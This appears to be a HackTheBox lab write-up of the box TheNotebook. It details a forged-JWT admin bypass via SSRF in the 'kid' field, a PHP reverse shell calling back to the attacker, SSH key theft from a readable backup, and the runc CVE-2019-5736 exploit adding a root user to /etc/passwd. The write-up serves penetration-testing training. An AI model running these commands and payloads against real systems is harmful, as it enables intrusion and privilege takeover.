---
Category:
  - B2R
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags:
  - JWT
  - RCE
  - SSRF
  - authorization-bypass
  - docker-exec-privesc
  - insecure-file-permissions
  - privesc/runc
  - Linux
---
## Introduction

>[!summary]
>**TheNoteBook** is a medium difficulty Linux box running a custom web application vulnerable to **authorization bypass** caused by a **SSRF** that allows to validate arbitrary JWT. Once authenticated the application suffers a **bug that allows to execute PHP file**, resulting in RCE. **Excessive permissions assigned to the noah’s home backup** archive allows to copy and extract it, resulting in the leakage of noah’s SSH private key. Finally, Noah is allowed to execute command within a docker container. Because the **runc** software version used in Docker before 18.09.2 suffers a **file-descriptor mishandling**, it is possible to leverage the **CVE-2019-5736** in order to** inject a malicious root user** and then login, obtaining high privileges on the target.

### Improved skills:

- Validation of arbitrary JWT
- SSRF authorization bypass
- runc privilege escalation (CVE-2019-5736)

### Used tools:

- nmap
- gobuster
- jwt.io
- tcpdump

## Video Writeup

<iframe width="660" height="415" src="https://www.youtube.com/embed/UumAFYRcZFE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


---

## Enumeration

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/TheNotebook]
└─$ sudo nmap -sS -p- 10.10.10.230 -oN scans/all-tcp-ports.txt -v
...
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi
...
```

Enumerated open TCP open ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/TheNotebook]
└─$ sudo nmap -sV -sT -sC -A -p22,80 10.10.10.230 -oN scans/tcp-open-ports.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
...
```

Nmap discovered only two services exposed by the target: an **OpenSSH 7.6p1** service running on port 22 **which disclosed the exact build version** and a **nginx 1.14.0** running on port 80. Because SSH usually does not offer a large attack surface, enumeration of target was primary focused on port 80.

Browsed port 80:

![Pasted image 20210430225428.png](../../zzz_res/attachments/Pasted_image_20210430225428.png)

Enumerated web directories and files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/TheNotebook]
└─$ gobuster dir -u http://10.10.10.230 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt
...
/admin                (Status: 403) [Size: 9]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
```

The site offered the possibility to register an account so one was created:

![Pasted image 20210430225959.png](../../zzz_res/attachments/Pasted_image_20210430225959.png)

![Pasted image 20210430230117.png](../../zzz_res/attachments/Pasted_image_20210430230117.png)

There were very few entry points, however, the application used **JWT to authenticate** users. Usually **bad implementation of JWT** allows **authentication bypass** or **application privilege escalation**, therefore it is always good to check them:

![Pasted image 20210522153124.png](../../zzz_res/attachments/Pasted_image_20210522153124.png)

Decoding the JWT using [jwt.io](https://jwt.io/) it came up that the **user privileges are contained inside the token** as well as the **path to the private key** used to validate it.

```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
{
  "username": "maoutis",
  "email": "maoutis@hackthebox.htb",
  "admin_cap": 0
}
```

Editing the *kid* field it was possible to **made the server contact a different target**:

```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://10.10.14.24:7070/privKey.key"
}
```

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ sudo tcpdump -i tun0 -n port 7070                        
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:47:46.263302 IP 10.10.10.230.38902 > 10.10.14.24.7070: Flags [S], seq 2910523052, win 64240, options [mss 1357,sackOK,TS val 1904549514 ecr 0,nop,wscale 7], length 0
17:47:46.263348 IP 10.10.14.24.7070 > 10.10.10.230.38902: Flags [R.], seq 0, ack 2910523053, win 0, length 0
```

## Foothold

Due to the **SSRF vulnerability**, the server can be tricked into **using an arbitrary key to validate the token**. This issue can be exploited by making the server **accept an arbitrary token with high privileges**, allowing to authenticate to the application as administrators instead of standard users.

Taking inspiration from the [following Akamai article](https://learn.akamai.com/en-us/webhelp/iot/jwt-access-control/GUID-BD7079F4-09ED-4FAB-A923-4ACFE254BA3E.html), a pair of rsa keys was created:

```bash
┌──(kali㉿kali)-[~/…/box/TheNotebook/exploit/keys]
└─$ openssl genrsa -out jwtRSA256-private.pem
Generating RSA private key, 2048 bit long modulus (2 primes)
............................................................................................................+++++
...........................................................................................+++++
e is 65537 (0x010001)

┌──(kali㉿kali)-[~/…/box/TheNotebook/exploit/keys]
└─$ openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
writing RSA key

┌──(kali㉿kali)-[~/…/box/TheNotebook/exploit/keys]
└─$ openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem

writing RSA key
```

Then following [this other Akamai article](https://learn.akamai.com/en-us/webhelp/iot/jwt-access-control/GUID-CB17F8FF-3367-4D4B-B3FE-FDBA53A5EA02.html) an arbitrary JWT containing admin privileges was created :

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ echo -n '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.24/privKey.key"}' | base64 | sed s/\+/-/ | sed -E s/=+$// > token.header

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ echo -n '{"username":"maoutis","email":"maoutis@hackthebox.htb","admin_cap":1}' | base64 | sed s/\+/-/ | sed -E s/=+$// > token.payload

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ cat token.*
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2
S2V5LmtleSJ9
eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJh
ZG1pbl9jYXAiOjF9

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9" | openssl dgst -sha256 -binary -sign  keys/jwtRSA256-private.pem | openssl enc -base64 | tr -d '\n=' | tr -- '+/' '-_' > token.signature

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ cat token.signature
dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA" > token.jwt
```

The RSA private key was renamed to the value specified within the token and then it was hosted:

```bash
┌──(kali㉿kali)-[~/…/box/TheNotebook/exploit/keys]
└─$ cp jwtRSA256-private.pem privKey.key

┌──(kali㉿kali)-[~/…/box/TheNotebook/exploit/keys]
└─$ sudo python3 -m http.server 80
```

The **cookie containing the current JWT was replaced** with the self signed one and then the `/admin` page was visited:

```
GET /admin HTTP/1.1
Host: 10.10.10.230
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: uuid=fc6beb6e-c388-4e19-b0d7-9587a82dac02; auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

![Pasted image 20210501003628.png](../../zzz_res/attachments/Pasted_image_20210501003628.png)

![Pasted image 20210501003652.png](../../zzz_res/attachments/Pasted_image_20210501003652.png)

Once logged as administrators all the other **notes were enumerated**, discovering a bug that allows RCE: 

![Pasted image 20210501004214.png](../../zzz_res/attachments/Pasted_image_20210501004214.png)

![Pasted image 20210501004235.png](../../zzz_res/attachments/Pasted_image_20210501004235.png)

![Pasted image 20210501004308.png](../../zzz_res/attachments/Pasted_image_20210501004308.png)

A [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) was so copied, adjusted and uploaded on the server:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php rev.php

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ nano rev.php
...
$ip = '10.10.14.24';  // CHANGE THIS
$port = 10099;       // CHANGE THIS
...
```

![Pasted image 20210501004535.png](../../zzz_res/attachments/Pasted_image_20210501004535.png)

![Pasted image 20210501004608.png](../../zzz_res/attachments/Pasted_image_20210501004608.png)

Finally a reverse shell was obtained clicking on the *view* button:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/TheNotebook]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.230] 43694
Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:52:28 up  7:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@thenotebook:/$ ^Z
zsh: suspended  nc -nlvp 10099

┌──(kali㉿kali)-[~/CTFs/HTB/box/TheNotebook]
└─$ stty raw -echo; fg

[1]  + continued  nc -nlvp 10099

www-data@thenotebook:/$ export TERM=xterm
www-data@thenotebook:/$ stty rows 60 columns 235
```

## Lateral Movement

Enumerated local users:

```bash
www-data@thenotebook:/$ cat /etc/passwd | grep -v nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
lxd:x:105:65534::/var/lib/lxd/:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
noah:x:1000:1000:Noah:/home/noah:/bin/bash
```

Enumerated backup files:

```bash
www-data@thenotebook:/var/backups$ ls -al
total 60
drwxr-xr-x  2 root root  4096 Apr 30 15:01 .
drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
-rw-r--r--  1 root root 33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
```

Excessive file permission on `home.tar.gz` allowed to copy the archive within `/tmp` and extract its contents, leaking `noah` ssh keys:

```bash
www-data@thenotebook:/var/backups$ cp home.tar.gz /tmp
www-data@thenotebook:/var/backups$ cd /tmp
www-data@thenotebook:/tmp$ gunzip home.tar.gz
www-data@thenotebook:/tmp$ tar -xf home.tar
www-data@thenotebook:/tmp$ cd home
www-data@thenotebook:/tmp/home$ ls
noah
www-data@thenotebook:/tmp/home$ cd noah/
www-data@thenotebook:/tmp/home/noah$ ls -al
total 32
drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 .
drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 ..
-rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc
drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache
drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg
-rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile
drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh
www-data@thenotebook:/tmp/home/noah$ cd .ssh
www-data@thenotebook:/tmp/home/noah/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```

Noah private key was then used to access the box:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/loot]
└─$ ssh noah@10.10.10.230 -i noah.key 
...
noah@thenotebook:~$ id
uid=1000(noah) gid=1000(noah) groups=1000(noah)
```

## Privilege Escalation

Enumerated sudo capabilities for noah:

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Connected to the docker container and discovered that high privileges was provided:

```bash
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
root@7b2fd74847ce:/opt/webapp# id
uid=0(root) gid=0(root) groups=0(root)
```

Discovered that runc was available:

```bash
...
[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                            
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it
...
```

Googling around for Docker privilege escalation techniques, an interesting [article from HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736) was found, talking about a `Runc exploit` (CVE-2019-5736) that allows elevation of privileges.

>[!bug]
>runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.
> 

Controlling the software versions of the target machine it was discovered that the box was **vulnerable to that CVE**:

```bash
noah@thenotebook:~$ runc -v
runc version 1.0.0~rc6+dfsg1
commit: 1.0.0~rc6+dfsg1-3
spec: 1.0.1
noah@thenotebook:~$ docker -v
Docker version 18.06.0-ce, build 0ffa825
```

On the attacker machine the [PoC from Frichetten](https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go) was downloaded, the payload was adjusted to inject a malicious root user, and then hosted for the download on the target:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go -O privesc.go
...
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ nano privesc.go
...
var payload = "#!/bin/bash \n echo 'root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash' >> /etc/passwd"
...
fd, err := os.Create("/bin/bash")
...
fmt.Println("[+] Overwritten /bin/bash successfully")
...

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ go build privesc.go

┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/exploit]
└─$ sudo python3 -m http.server 80

[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

The exploit was downloaded inside the docker container and executed:

```bash
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
root@719a30d9c793:/opt/webapp# wget 10.10.14.24/privesc
--2021-05-01 11:24:09--  http://10.10.14.24/privesc
...
root@719a30d9c793:/opt/webapp# chmod +x privesc
root@719a30d9c793:/opt/webapp# ./privesc 
[+] Overwritten /bin/bash successfully
 < exploit paused >
```

From another SSH session the exploit was then triggered: Session 2:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/TheNotebook/loot]
└─$ ssh noah@10.10.10.230 -i noah.key 
...
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
No help topic for '/bin/bash'
```

Session 1:

```bash
...
[+] Overwritten /bin/bash successfully
 < exploit paused >
[+] Found the PID: 34
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc0000a8180}
```

Finally it was escalated to root switching to the injected `root2` user:

```bash
noah@thenotebook:~$ su root2
Password: evil
root@thenotebook:/home/noah# id && hostname && cat /root/root.txt && ifconfig -a
uid=0(root) gid=0(root) groups=0(root)
thenotebook
2328e98b072c67c6d418ae24d00523d3
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d6:10:3f:8a  txqueuelen 0  (Ethernet)
        RX packets 12886  bytes 699043 (699.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19288  bytes 32590700 (32.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.230  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:d5:cf  txqueuelen 1000  (Ethernet)
        RX packets 39715  bytes 36782225 (36.7 MB)
        RX errors 0  dropped 171  overruns 0  frame 0
        TX packets 35339  bytes 2907270 (2.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 200 (200.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 200 (200.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9864dad: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 32:f8:e1:c2:77:95  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13  bytes 546 (546.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethff601c6: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether da:d1:0c:17:2a:4b  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Trophy

>[!quote]
>A bug is never just a mistake. It represents something bigger. An error of thinking. That makes you who you are.
>
>\- Elliot Alderson (Mr. Robot)
